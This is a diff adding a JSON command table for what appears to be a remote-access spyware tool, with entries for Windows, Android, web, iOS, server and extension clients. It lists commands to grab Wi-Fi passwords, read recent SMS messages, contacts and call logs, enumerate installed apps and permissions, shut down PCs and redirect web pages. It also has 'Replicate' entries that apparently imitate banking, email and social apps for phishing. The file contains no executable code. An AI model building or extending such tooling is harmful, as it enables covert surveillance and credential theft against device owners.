@@ -1,0 +1,68 @@
+{
+    "windows":{
+      "command":[
+        {"name":"getWifiPass","code":"GWPSD","type":"c","inputNo":0,"param":[]},
+        {"name":"Shutdown pc","code":"SHDPC","type":"e","inputNo":0,"param":[]}
+      ]
+    },
+    "android":{
+      "command":[
+        {"name":"check if wifi connected","code":"WFCON","type":"c","inputNo":0,"param":[]},
+        {"name":"Battery percentage","code":"BTYPC","type":"c","inputNo":0,"param":[]},
+        {"name":"Display ON/OFF","code":"DSPC","type":"c","inputNo":0,"param":[]},
+        {"name":"Phone Charging/Not Charging","code":"CHGC","type":"c","inputNo":0,"param":[]},
+        {"name":"Increase Media Volume","code":"MDVI","type":"c","inputNo":0,"param":[]},
+        {"name":"Decrease Media Volume","code":"MDVD","type":"c","inputNo":0,"param":[]},
+        {"name":"Increase Ring Volume","code":"RNVI","type":"c","inputNo":0,"param":[]},
+        {"name":"Decrease Ring Volume","code":"RNVD","type":"c","inputNo":0,"param":[]},
+        {"name":"Flash Light ON","code":"FLSE","type":"c","inputNo":0,"param":[]},
+        {"name":"Flash Light OFF","code":"FLSD","type":"c","inputNo":0,"param":[]},
+        {"name":"Check GPS Enabled/Disabled","code":"GPSC","type":"c","inputNo":0,"param":[]},
+        {"name":"All Installed Applications","code":"INAPD","type":"c","inputNo":0,"param":[]},
+        {"name":"Android Details","code":"ANDDT","type":"c","inputNo":0,"param":[]},
+        {"name":"Check HeadPhones Connected","code":"HSCON","type":"c","inputNo":0,"param":[]},
+        {"name":"Check Bluetooth enabled/disabled","code":"BTTCK","type":"c","inputNo":0,"param":[]},
+        {"name":"Get Permissions Allowed/Denied","code":"PMSGN","type":"c","inputNo":0,"param":[]},
+        {"name":"Last 5 SMS","code":"L5MSG","type":"c","inputNo":0,"param":[]},
+        {"name":"All COntacts","code":"GTCNT","type":"c","inputNo":0,"param":[]},
+        {"name":"Last 10 Call Logs","code":"GTLOG","type":"c","inputNo":0,"param":[]},
+        {"name":"Play The Sound","code":"PLSND","type":"c","inputNo":0,"param":[]},
+        {"name":"Replicate [Amazon]","code":"CHGAMZ","type":"c","inputNo":0,"param":[]},
+        {"name":"Replicate [Google Calendar]","code":"CHGCLD","type":"c","inputNo":0,"param":[]},
+        {"name":"Replicate [Chrome]","code":"CHGCHR","type":"c","inputNo":0,"param":[]},
+        {"name":"Replicate [Facebook]","code":"CHGFBK","type":"c","inputNo":0,"param":[]},
+        {"name":"Replicate [GMAIL]","code":"CHGGML","type":"c","inputNo":0,"param":[]},
+        {"name":"Replicate [Google]","code":"CHGGLE","type":"c","inputNo":0,"param":[]},
+        {"name":"Replicate [Google pay]","code":"CHGGPY","type":"c","inputNo":0,"param":[]},
+        {"name":"Replicate [Instagram]","code":"CHGINS","type":"c","inputNo":0,"param":[]},
+        {"name":"Replicate [Google Maps]","code":"CHGMPS","type":"c","inputNo":0,"param":[]},
+        {"name":"Replicate [Google Photos]","code":"CHGPHT","type":"c","inputNo":0,"param":[]},
+        {"name":"Replicate [PlayStore]","code":"CHGPLS","type":"c","inputNo":0,"param":[]},
+        {"name":"Replicate [Whatsapps]","code":"CHGWSP","type":"c","inputNo":0,"param":[]},
+        {"name":"Replicate [Settings]","code":"CHGDFT","type":"c","inputNo":0,"param":[]}
+      ]
+    },
+    "web":{
+      "command":[
+        {"name":"web details","code":"WEBDT","type":"c","inputNo":0,"param":[]},
+        {"name":"redirect to page","code":"RDRPG","type":"e","inputNo":1,"param":["site"]}
+      ]
+    },
+    "server":{
+      "command":[
+        {"name":"getWifiPass","code":"GWP15","type":"c","inputNo":0,"param":[]},
+        {"name":"Shutdown pc","code":"SHD15","type":"e","inputNo":0,"param":[]}
+      ]
+    },
+    "ios":{
+      "command":[
+        {"name":"getWifiPass","code":"GWP15","type":"c","inputNo":0,"param":[]},
+        {"name":"Shutdown pc","code":"SHD15","type":"e","inputNo":0,"param":[]}
+      ]
+    },
+    "extension":{"command":[
+        {"name":"getWifiPass","code":"GWP15","type":"c","inputNo":0,"param":[]},
+        {"name":"Shutdown pc","code":"SHD15","type":"e","inputNo":0,"param":[]}
+      ]}
+  
+  }
